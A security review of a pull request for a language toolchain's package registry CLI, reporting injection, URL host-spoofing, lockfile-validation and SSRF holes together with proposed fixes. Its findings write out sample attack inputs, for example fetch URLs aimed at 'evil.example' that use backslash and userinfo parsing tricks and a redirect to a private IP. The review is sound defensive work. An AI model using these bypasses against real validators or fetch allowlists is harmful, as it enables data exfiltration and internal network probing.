# Critic Review 046: Registry CLI, `tj.lock`, `--min-trust`, and Validator (`fb353d7`, PR #61)

**Verdict:** Hold merge on PR #61 (`fb353d7`) until two security blockers (`R61-1` and `R61-2`) and two validation/SSRF gaps (`R61-3` and `R61-4`) are fixed; then implement Option B (`crypto.idempotencyKey`) next per `critic-045`.

## What Works Well

- Zero bytes added to `tj-core`, `tj_wasm.wasm` (`793 KB`), Android, or iOS builds, and zero new Cargo dependencies (`serde_json::Value` directly).
- `app::read` (`crates/tj-cli/src/app.rs:26-44`) verifies both SHA-256 and AST permissions on every build/dev/serve load, and watches `.tj-packages/<name>/plugin.tj` and `tj.lock` for live reload.
- `verify_package_source` catches `fetch` aliasing (`const f = fetch`), built-in plugin wrapper imports (`import { complete } from "tj:ai"`), typosquats, and standalone compliance-pack schema checks (`Pack::validate_standalone`).

---

## Findings

### `R61-1` (Blocker): Bundle marker injection (`//# file:`), relative consumer-file imports (`./...`), and skipped `tj_core::compile` on `tj:*` imports

**Evidence:** `crates/tj-cli/src/registry.rs:576-593`, `crates/tj-cli/src/app.rs:26-44`, and `crates/tj-core/src/modules.rs:60-68, 119-132`.

1. **Bundle marker injection (`//# file:`):** `modules::files` (`modules.rs:63`) splits multi-file bundles on any line starting with `//# file: `. Because `tj_core::syntax::parse` treats `//# file: ...` as a regular comment, a package containing `//# file: ./spoof.tj` or `//# file: tj:other` parses as one file in `verify_package_source` and then splits into separate module files inside `modules::bundle` (`app.rs:71`).
2. **Relative imports escape into the consumer app's directory (`app.rs:31`, `modules.rs:119-132`):** When `app::read` processes `import { x } from "./secret"` inside `tj:money`, `modules::resolve("tj:money", "./secret")` pops `"tj:money"` and returns `Ok("secret.tj")`, loading `secret.tj` from the consumer app's folder into the package.
3. **`imports_external_pkg` skips `tj_core::compile` (`registry.rs:577-592`):** Adding `import { x } from "tj:other"` sets `imports_external_pkg = true` and skips `tj_core::compile` completely during `tj registry check` and `tj add`, allowing type errors, undefined identifiers, `@pii` flow leaks (`flow.rs`), and invalid `@invariant`s through validation.

- **Case for fixing:** Reject any package source line starting with `//# file:`; reject relative imports (`!imp.from.starts_with("tj:")`) inside registry packages; and reject non-builtin `tj:*` imports in standalone packages until manifest `dependencies` exist (so `tj_core::compile` always runs during `tj registry check` and `tj add`).
- **Case against / cost:** ~15 lines in `crates/tj-cli/src/registry.rs`. Disallowing undeclared inter-package `tj:<other>` imports until a `dependencies` field is added matches `PackageManifest` having no `dependencies` array today and prevents hidden transitive permissions.

---

### `R61-2` (Blocker): `extract_https_host` and `collect_expr_caps` allow `fetch` host spoofing (`https://evil.example\\@safe.example/`) and `HTTP://` / `//` plain-HTTP bypasses

**Evidence:** `crates/tj-cli/src/registry.rs:792-806` and `crates/tj-cli/src/registry.rs:815-835`.

1. **WHATWG backslash + `@` userinfo differential (`registry.rs:797-798`):** `extract_https_host` splits authority on `['/', '?', '#']` (not `'\\'`) and takes `authority.rsplit_once('@')` (`(_, hp) -> hp`). Given `fetch("https://evil.example\\@safe.example/steal")`, `extract_https_host` returns `Some("safe.example")`, passing `permissions.network: ["safe.example"]`. In browsers (`hosts/web/tinyjump.js` calls `window.fetch`), WHATWG URL treats `\` as `/`, connecting to **`evil.example`** (`/@safe.example/steal`).
2. **Uppercase `HTTP://` and protocol-relative `//` bypasses (`registry.rs:793, 816, 826`):** `u.starts_with("http://")` is case-sensitive. A package with `permissions.network: ["*"]` calling `fetch("HTTP://evil.example/x")` or `fetch("//evil.example/x")` leaves `plain_http_urls` empty and sets `dynamic_fetch = true` (allowed by `"*"`), sending cleartext HTTP in browsers. Conversely, `fetch("HTTPS://api.example.com/x")` fails `extract_https_host`.

- **Case for fixing:** Reject `@`, `\`, whitespace, and control characters inside `authority` (and validate the extracted `host` with `parse_fetch_allow(&host)` rejecting `*.`), check schemes case-insensitively (`to_ascii_lowercase()`), and treat protocol-relative `"//"` URLs as disallowed plain/ambiguous scheme URLs.
- **Case against / cost:** ~15 lines in `crates/tj-cli/src/registry.rs` and two unit tests. No legitimate registry package needs HTTP basic-auth `user@host` credentials hardcoded in a `fetch` URL literal.

---

### `R61-3` (High): Committed `tj.lock` entries skip `validate_manifest`, and `tj check --json` skips lockfile / `--min-trust` checks on two paths

**Evidence:** `crates/tj-cli/src/registry.rs:628, 988-1110` and `crates/tj-cli/src/main.rs:401-434`.

1. **`tj.lock` skips `validate_manifest` (`registry.rs:988-1110`):** `load_locked_module`, `check_lockfile`, and `retro_findings` construct `manifest_from_locked` and call `verify_package_source` without `validate_manifest`. A hand-edited or PR-submitted `tj.lock` with `"kind": "custom"`, `"commit": "HEAD"`, an unapproved `license`, an `http://` `source`, or malformed `permissions.network` entries (silently dropped by `filter_map` at line 628) passes `tj check`, `tj serve`, and `tj retro`. Note: for `"port"` packages, either store `port` in `LockedPackage` or skip the `port` metadata check when validating from `tj.lock`.
2. **`tj check` `--json` gaps (`main.rs:401-434`):**
   - `tj check app.tj --manifest --json` (`line 402`) only runs `registry::check_lockfile` when `min_trust.is_some()`, missing tampered unused packages in `tj.lock` when `--min-trust` is omitted.
   - `tj check app.tj --against old.tj --json --min-trust verified` (`lines 424-434`) returns early without calling `registry::check_lockfile` at all, silently ignoring `--min-trust`.

- **Case for fixing:** Run `validate_manifest` inside `load_locked_module`, `check_lockfile`, and `retro_findings` (allowing `commit == "local"` only when `source` is a clean relative path), and call `registry::check_lockfile(app_dir, min_trust)?` unconditionally in both `--manifest --json` and `--against --json` branches (emitting warnings to `stderr` so JSON `stdout` stays pure).
- **Case against / cost:** ~12 lines across `registry.rs` and `main.rs`.

---

### `R61-4` (High): `fetch_bytes_https` lacks `public_only` SSRF protection on remote URLs and `302` redirects

**Evidence:** `crates/tj-cli/src/registry.rs:1114-1125` vs `crates/tj-cli/src/engine.rs:993-1000`.

When `!allow_loopback`, `fetch_bytes_https` builds `ureq::AgentBuilder` without `public_only`. A malicious `manifest.url` (or an HTTPS `302` redirect from `https://attacker.example/pkg.tj` to `https://10.0.0.5/secret`, which satisfies `final_url.starts_with("https://")`) can probe private RFC1918, loopback, link-local, or cloud-metadata addresses during `tj add` or CI runs.

- **Case for fixing:** Reuse `crate::engine::public_only` (`pub(crate) fn public_only`) via `.resolver(crate::engine::public_only)` on the `ureq::AgentBuilder` whenever `!allow_loopback`.
- **Case against / cost:** 4 lines (`pub(crate)` on `engine::public_only` + `.resolver(...)` in `registry.rs`). Private enterprise HTTPS registries on internal RFC1918 IPs can either use a local/mounted directory or respect `TJ_ALLOW_PRIVATE_FETCH=1` if desired.

---

## Roadmap Note (`critic-045`)

Once `R61-1` through `R61-4` are resolved and PR #61 merges, please implement **Option B (`crypto.idempotencyKey`)** from `docs/retried-effects.md` next per the owner's decision in `feedback/2026-11-23-critic-045-owner-decision-and-pr60-signoff.md` (which landed right as `registry-cli` started).

## Not Checked

- Did not run `cargo test` or `bash scripts/budget.sh` locally on `fb353d7`; will verify on the follow-up commit before sign-off.
